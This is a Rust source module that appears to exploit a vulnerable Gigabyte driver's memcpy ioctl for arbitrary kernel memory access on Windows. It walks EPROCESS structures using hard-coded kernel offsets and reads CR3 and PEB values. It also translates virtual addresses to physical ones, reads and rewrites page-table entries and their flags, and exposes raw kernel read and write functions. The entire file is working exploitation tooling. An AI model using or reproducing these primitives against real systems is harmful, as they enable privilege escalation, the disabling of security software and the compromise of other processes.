use crate::gdrv3_ioctls::*;
use bitflags::bitflags;
use std::ffi::CStr;
use windows::Win32::{
    Foundation::*,
    System::WindowsProgramming::{NtQuerySystemInformation, SYSTEM_INFORMATION_CLASS},
};


// Yummy hard coded statics my favourite
pub const PS_INITIAL_SYSTEM_PROCESS_OFFSET: u64 = 0xcfc420;
pub const OFFSET_MM_PTE_BASE: u64 = 0xcfb358;
pub const UNIQUE_PROCESS_ID_OFFSET: u64 = 0x440;
pub const ACTIVE_PROCESS_LINKS_OFFSET: u64 = 0x448;
pub const DIRECTORY_TABLE_BASE_OFFSET: u64 = 0x28;
pub const PEB_OFFSET: u64 = 0x550;
pub const IMAGE_BASE_ADDRESS_OFFSET: u64 = 0x10;
pub const SYSTEM_MODULE_INFORMATION: i32 = 0x0b;

pub type VirtualAddress = u64;
pub type PhysicalAddres = u64;

#[repr(C)]
struct SystemModuleEntry {
    section: HANDLE,
    mapped_base: u64,
    image_base: u64,
    image_size: u32,
    flags: u32,
    load_order_index: u16,
    init_order_index: u16,
    load_count: u16,
    offset_to_file_name: u16,
    full_path_name: [i8; 256],
}

pub fn get_driver_base(driver_name: &str) -> Option<u64> {
    let mut length = 0u32;
    unsafe {
        // First call with zero pointer to get the size of the array
        NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(SYSTEM_MODULE_INFORMATION),
                                 std::ptr::null_mut(),
                                 length,
                                 &mut length as _).ok();

        // Allocate buffer with the correct size
        // Technically there is a race condition here SAD!
        let mut buffer = vec![0u8; length as usize];

        // Get the information with the previously acquired buffer size
        NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS(SYSTEM_MODULE_INFORMATION),
                                 buffer.as_mut_ptr() as _,
                                 length,
                                 &mut length as _).unwrap();

        // The amount of entries
        let count = u64::from_le_bytes(buffer[0..8].try_into().unwrap());

        // Create a slice from the entries returned by NtQuerySystemInformation
        let system_module_entries = std::slice::from_raw_parts((buffer.as_ptr().offset(8))
                                                               as *const SystemModuleEntry,
                                                               count as usize);

        // Iterate over the entries and return the image base if the driver is found
        for entry in system_module_entries.iter() {
            let entry_driver_name = get_driver_name(entry);
            if entry_driver_name == driver_name {
                println!("Found driver {} at {:#x}", driver_name, entry.image_base);
                return Some(entry.image_base);
            }
        }
        None
    }
}

fn get_driver_name(entry: &SystemModuleEntry) -> &str {
    // Convert the raw byte array to a rust str object for comparison
    let driver_name_cstr = unsafe {
        CStr::from_ptr(entry.full_path_name
                            .as_ptr()
                            .offset(entry.offset_to_file_name as _))
    };
    driver_name_cstr.to_str().unwrap()
}

bitflags! {
    pub struct EntryFlags: u64 {
        const PRESENT =         1 << 0;
        const WRITABLE =        1 << 1;
        const USER_ACCESSIBLE = 1 << 2;
        const WRITE_THROUGH =   1 << 3;
        const NO_CACHE =        1 << 4;
        const ACCESSED =        1 << 5;
        const DIRTY =           1 << 6;
        const HUGE_PAGE =       1 << 7;
        const GLOBAL =          1 << 8;
        const NO_EXECUTE =      1 << 63;
    }
}

#[derive(Debug)]
pub struct PageEntry(pub u64);
impl PageEntry {
    pub fn get_flags(&self) -> EntryFlags {
        EntryFlags::from_bits_truncate(self.0)
    }

    pub fn set_flags(&mut self, flags: EntryFlags) {
        let flags_address_combined = flags.bits() | (0x000f_ffff_ffff_f000 & self.0);
        self.0 = flags_address_combined;
    }
    pub fn get_base_address(&self) -> u64 {
        self.0 & 0x000f_ffff_ffff_f000
    }
}

fn get_pml4_entry_address(self_ref_offset: u64, pml4_offset: u64) -> u64 {
    let address = 0xffff_0000_0000_0000
                  + (self_ref_offset & 0x1ff).overflowing_shl(39).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(30).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(21).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(12).0
                  + (pml4_offset & 0x1ff) * 8;
    address
}

fn get_pdp_entry_address(self_ref_offset: u64, pml4_offset: u64, pdp_offset: u64) -> u64 {
    let address = 0xffff_0000_0000_0000
                  + (self_ref_offset & 0x1ff).overflowing_shl(39).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(30).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(21).0
                  + (pml4_offset & 0x1ff).overflowing_shl(12).0
                  + (pdp_offset & 0x1ff) * 8;
    address
}

fn get_pd_entry_address(self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64)
                        -> u64 {
    let address = 0xffff_0000_0000_0000
                  + (self_ref_offset & 0x1ff).overflowing_shl(39).0
                  + (self_ref_offset & 0x1ff).overflowing_shl(30).0
                  + (pml4_offset & 0x1ff).overflowing_shl(21).0
                  + (pdp_offset & 0x1ff).overflowing_shl(12).0
                  + (pd_offset & 0x1ff) * 8;
    address
}

fn get_pt_entry_address(self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64,
                        pt_offset: u64)
                        -> u64 {
    let address = 0xffff_0000_0000_0000
                  + (self_ref_offset & 0x1ff).overflowing_shl(39).0
                  + (pml4_offset & 0x1ff).overflowing_shl(30).0
                  + (pdp_offset & 0x1ff).overflowing_shl(21).0
                  + (pd_offset & 0x1ff).overflowing_shl(12).0
                  + (pt_offset & 0x1ff) * 8;
    address
}

pub fn get_pml4_offset(address: VirtualAddress) -> u64 {
    (address & 0x0000_ff80_0000_0000) >> 39
}

pub fn get_pdp_offset(address: VirtualAddress) -> u64 {
    (address & 0x0000_007f_c000_0000) >> 30
}

pub fn get_pd_offset(address: VirtualAddress) -> u64 {
    (address & 0x0000_0000_3fe0_0000) >> 21
}

pub fn get_pt_offset(address: VirtualAddress) -> u64 {
    (address & 0x0000_0000_001f_f000) >> 12
}

impl GigabyteDriver {
    pub fn get_pml4_entry(&self, self_ref_offset: u64, pml4_offset: u64) -> PageEntry {
        let pml4_entry_address = get_pml4_entry_address(self_ref_offset, pml4_offset);

        let mut entry = 0u64;
        unsafe { self.ioctl_memcpy(pml4_entry_address, std::mem::transmute(&mut entry), 8) };

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pdp_entry(&self,
                         self_ref_offset: u64,
                         pml4_offset: u64,
                         pdp_offset: u64)
                         -> PageEntry {
        let pdp_entry_address = get_pdp_entry_address(self_ref_offset, pml4_offset, pdp_offset);

        let mut entry = 0u64;
        unsafe { self.ioctl_memcpy(pdp_entry_address, std::mem::transmute(&mut entry), 8) };

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pd_entry(&self,
                        self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64)
                        -> PageEntry {
        let pd_entry_address =
            get_pd_entry_address(self_ref_offset, pml4_offset, pdp_offset, pd_offset);

        let mut entry = 0u64;
        unsafe { self.ioctl_memcpy(pd_entry_address, std::mem::transmute(&mut entry), 8) };

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pt_entry(&self,
                        self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64,
                        pt_offset: u64)
                        -> PageEntry {
        let pt_entry_address = get_pt_entry_address(self_ref_offset,
                                                    pml4_offset,
                                                    pdp_offset,
                                                    pd_offset,
                                                    pt_offset);

        let mut entry = 0u64;
        unsafe { self.ioctl_memcpy(pt_entry_address, std::mem::transmute(&mut entry), 8) };

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn set_pml4_entry(&self, self_ref_offset: u64, pml4_offset: u64, pml4_entry: &PageEntry) {
        let pml4_entry_address = get_pml4_entry_address(self_ref_offset, pml4_offset);

        unsafe { self.ioctl_memcpy(std::mem::transmute(&pml4_entry.0), pml4_entry_address, 8) };
    }

    pub fn set_pdp_entry(&self,
                         self_ref_offset: u64,
                         pml4_offset: u64,
                         pdp_offset: u64,
                         pdp_entry: &PageEntry) {
        let pdp_entry_address = get_pdp_entry_address(self_ref_offset, pml4_offset, pdp_offset);

        unsafe { self.ioctl_memcpy(std::mem::transmute(&pdp_entry.0), pdp_entry_address, 8) };
    }

    pub fn set_pd_entry(&self,
                        self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64,
                        pd_entry: &PageEntry) {
        let pd_entry_address =
            get_pd_entry_address(self_ref_offset, pml4_offset, pdp_offset, pd_offset);

        unsafe { self.ioctl_memcpy(std::mem::transmute(&pd_entry.0), pd_entry_address, 8) };
    }

    pub fn set_pt_entry(&self,
                        self_ref_offset: u64,
                        pml4_offset: u64,
                        pdp_offset: u64,
                        pd_offset: u64,
                        pt_offset: u64,
                        pt_entry: &PageEntry) {
        let pt_entry_address = get_pt_entry_address(self_ref_offset,
                                                    pml4_offset,
                                                    pdp_offset,
                                                    pd_offset,
                                                    pt_offset);

        unsafe { self.ioctl_memcpy(std::mem::transmute(&pt_entry.0), pt_entry_address, 8) };
    }

    pub fn get_pml4_entry_phys(&self, cr3_value: PhysicalAddres, pml4_offset: u64) -> PageEntry {
        let pml4_entry_address = cr3_value + pml4_offset * 8;

        let entry = self.read_phys_mem_qword(pml4_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pdp_entry_phys(&self, pdp_offset: u64, pml4_entry: &PageEntry) -> PageEntry {
        let pdp_entry_address = pml4_entry.get_base_address() + pdp_offset * 8;


        let entry = self.read_phys_mem_qword(pdp_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pd_entry_phys(&self, pd_offset: u64, pdp_entry: &PageEntry) -> PageEntry {
        let pd_entry_address = pdp_entry.get_base_address() + pd_offset * 8;


        let entry = self.read_phys_mem_qword(pd_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pt_entry_phys(&self, pt_offset: u64, pd_entry: &PageEntry) -> PageEntry {
        let pt_entry_address = pd_entry.get_base_address() + pt_offset * 8;


        let entry = self.read_phys_mem_qword(pt_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pdp_entry_phys_offsets(&self,
                                      cr3_value: PhysicalAddres,
                                      pml4_offset: u64,
                                      pdp_offset: u64)
                                      -> PageEntry {
        let pml4_entry = self.get_pml4_entry_phys(cr3_value, pml4_offset);
        let pdp_entry_address = pml4_entry.get_base_address() + pdp_offset * 8;


        let entry = self.read_phys_mem_qword(pdp_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pd_entry_phys_offsets(&self,
                                     cr3_value: PhysicalAddres,
                                     pml4_offset: u64,
                                     pdp_offset: u64,
                                     pd_offset: u64)
                                     -> PageEntry {
        let pdp_entry = self.get_pdp_entry_phys_offsets(cr3_value, pml4_offset, pdp_offset);
        let pd_entry_address = pdp_entry.get_base_address() + pd_offset * 8;

        println!("pd_entry_address physical -> {:#x?}", pd_entry_address);

        let entry = self.read_phys_mem_qword(pd_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    pub fn get_pt_entry_phys_offsets(&self,
                                     cr3_value: PhysicalAddres,
                                     pml4_offset: u64,
                                     pdp_offset: u64,
                                     pd_offset: u64,
                                     pt_offset: u64)
                                     -> PageEntry {
        let pd_entry =
            self.get_pd_entry_phys_offsets(cr3_value, pml4_offset, pdp_offset, pd_offset);
        let pt_entry_address = pd_entry.get_base_address() + pt_offset * 8;


        let entry = self.read_phys_mem_qword(pt_entry_address);

        let page_entry = PageEntry(entry);
        page_entry
    }

    fn get_pid_from_eprocess(&self, eprocess: u64) -> usize {
        let mut pid: usize = 0;
        self.ioctl_memcpy(eprocess + UNIQUE_PROCESS_ID_OFFSET,
                          &mut pid as *mut _ as _,
                          8);
        pid
    }
    pub fn virt_to_physical(&self, cr3: u64, address: VirtualAddress) -> PhysicalAddres {
        // These may or may not be valid depending on if large pages are used
        let pml4_offset = get_pml4_offset(address);
        let pdp_offset = get_pdp_offset(address);
        let pd_offset = get_pd_offset(address);
        let pt_offset = get_pt_offset(address);

        let pml4_entry = self.get_pml4_entry_phys(cr3, pml4_offset);
        let pdp_entry = self.get_pdp_entry_phys(pdp_offset, &pml4_entry);

        if pdp_entry.get_flags().contains(EntryFlags::HUGE_PAGE) {
            println!("pdp is HUGE_PAGE");
            let page_offset = address & 0x3fff_ffff;
            return pdp_entry.get_base_address() + page_offset;
        }

        let pd_entry = self.get_pd_entry_phys(pd_offset, &pdp_entry);

        if pd_entry.get_flags().contains(EntryFlags::HUGE_PAGE) {
            println!("pd is HUGE_PAGE");
            // TODO! WHY 1 HERE WHY WHY WHY
            let page_offset = address & 0x1f_ffff;
            return pd_entry.get_base_address() + page_offset;
        }

        let pt_entry = self.get_pt_entry_phys(pt_offset, &pd_entry);

        let page_offset = address & 0xfff;
        pt_entry.get_base_address() + page_offset
    }

    pub fn get_eprocess_by_pid(&self, process_id: usize) -> Option<u64> {
        let ntoskrnl_base = get_driver_base("ntoskrnl.exe").unwrap();
        let ps_initial_system_process_address = ntoskrnl_base + PS_INITIAL_SYSTEM_PROCESS_OFFSET;
        let mut ps_initial_system_process = 0u64;

        self.ioctl_memcpy(ps_initial_system_process_address,
                          &mut ps_initial_system_process as *mut _ as _,
                          8);
        println!("PsInitialSystemProcess -> {:#x?}",
                 ps_initial_system_process);
        let pid = self.get_pid_from_eprocess(ps_initial_system_process);

        let mut current_eprocess = ps_initial_system_process;
        let mut current_pid = pid;
        let mut first = true;

        loop {
            if current_pid == process_id {
                return Some(current_eprocess);
            }

            if current_eprocess == ps_initial_system_process && !first {
                break;
            }

            self.ioctl_memcpy(current_eprocess + ACTIVE_PROCESS_LINKS_OFFSET,
                              &mut current_eprocess as *mut _ as _,
                              8);

            println!("PID -> {:#x?}", current_pid);

            current_eprocess -= ACTIVE_PROCESS_LINKS_OFFSET;
            current_pid = self.get_pid_from_eprocess(current_eprocess);

            first = false;
        }
        None
    }

    pub fn get_cr3_value_eprocess(&self, eprocess: u64) -> u64 {
        let mut cr3_value = 0;
        self.ioctl_memcpy(eprocess + DIRECTORY_TABLE_BASE_OFFSET,
                          &mut cr3_value as *mut _ as _,
                          8);
        cr3_value
    }

    pub fn get_peb_from_eprocess(&self, eprocess: u64) -> VirtualAddress {
        let mut peb = 0u64;
        self.ioctl_memcpy(eprocess + PEB_OFFSET, &mut peb as *mut _ as _, 8);
        println!("PEB -> {:#x}", peb);
        peb
    }

    pub fn get_mm_pte_base(&self) -> u64 {
        let mut mm_pte_base = 0u64;
        let ntoskrnl_base = get_driver_base("ntoskrnl.exe").unwrap();

        unsafe {
            self.ioctl_memcpy(ntoskrnl_base + OFFSET_MM_PTE_BASE,
                              std::mem::transmute(&mut mm_pte_base),
                              8)
        };
        mm_pte_base
    }

    pub fn read_bytes(&self, source: u64, size: usize) -> Vec<u8> {
        let mut buffer_vec = vec![0u8; size];

        self.ioctl_memcpy(source, buffer_vec.as_mut_ptr() as _, size as u32);

        buffer_vec
    }

    pub fn write_bytes(&self, dest: u64, source_buffer: &[u8]) {
        self.ioctl_memcpy(source_buffer.as_ptr() as _, dest, source_buffer.len() as _);
    }
}
